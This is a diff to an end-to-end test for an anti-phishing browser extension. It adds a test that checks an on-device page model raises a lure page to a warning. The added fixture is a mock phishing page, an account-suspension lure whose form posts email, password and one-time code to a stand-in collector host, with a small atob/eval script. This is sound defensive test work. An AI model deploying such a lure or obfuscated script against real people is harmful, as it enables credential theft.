@@ -4,10 +4,12 @@
 // 127.0.0.1:8000 first, with lists built from a feed that lists example.com (see docs/BACKEND.md).
 // Needs Playwright (global or local) and a Chromium. Run: node build.mjs && node e2e/smoke.mjs
 //
-// Pages (verdicts from the shipped model, thresholds 0.865 suspicious / 0.9855 dangerous):
+// Pages (verdicts from the shipped models):
 //   http://www.wikipedia.org:8123/wiki/Phishing  safe
 //   http://evil-blocked.com:8123/a               suspicious -> banner
-//   http://evil-blocked.com:8123/b               suspicious + password form to another site -> dangerous
+//   http://evil-blocked.com:8123/login           suspicious + password form to another site -> dangerous
+//                                                (page too short for the page model: form rule)
+//   http://evil-blocked.com:8123/signin          suspicious address, lure page -> page model: dangerous
 //   http://secure-paypal-login.xyz:8123/         dangerous -> warning page, "proceed anyway"
 //   http://example.com:8123/                     safe by the model, on the stub blocklist -> warning page
 
@@ -52,9 +54,20 @@ const backend = createServer(async (req, res) => {
   res.end();
 });
 
+// A page with enough text for the page model: account-suspended lure, password and OTP fields.
+const SIGNIN_PAGE = `<!DOCTYPE html><html><head><title>Sign in to your account</title></head><body>
+<h1>Your account has been suspended</h1><p>We noticed unusual activity. Verify your identity within 24
+hours or your account will be closed. Enter your password and the one-time code we sent you to confirm
+your account and restore access immediately.</p>
+<form action="https://collector-api.example.net/submit" method="post"><input name="email" placeholder="Email">
+<input type="password" name="password"><input name="otp" placeholder="OTP code"><button type="submit">Verify</button></form>
+<script>var x=atob("aGVsbG8=");eval(x);</script></body></html>`;
+
 const pages = createServer((req, res) => {
   res.setHeader("Content-Type", "text/html");
-  if (req.url === "/login") {
+  if (req.url === "/signin") {
+    res.end(SIGNIN_PAGE);
+  } else if (req.url === "/login") {
     res.end('<form action="http://collector.test:8123/p" method="post"><input type="password" name="p"></form>');
   } else {
     res.end(`<html><body><h1 id="ok">page ${req.url}</h1></body></html>`);
@@ -113,6 +126,12 @@ try {
   await settle(page, async () => page.url().startsWith(`chrome-extension://${extId}/warning.html`), "warning page");
   assert.match(await page.locator("#reasons").innerText(), /different website/);
   console.log("ok  cross-site password form escalates to the warning page");
+
+  // 3b. page model: a lure page on a suspicious address is read on the device and raised to dangerous
+  page = await open("http://evil-blocked.com:8123/signin");
+  await settle(page, async () => page.url().startsWith(`chrome-extension://${extId}/warning.html`), "page-model warning");
+  assert.ok((await page.locator("#reasons li").count()) >= 1);
+  console.log("ok  page model reads the page and raises it to the warning page");
 
   // 4. dangerous by the model: warning page, report, proceed anyway
   page = await open("http://secure-paypal-login.xyz:8123/");
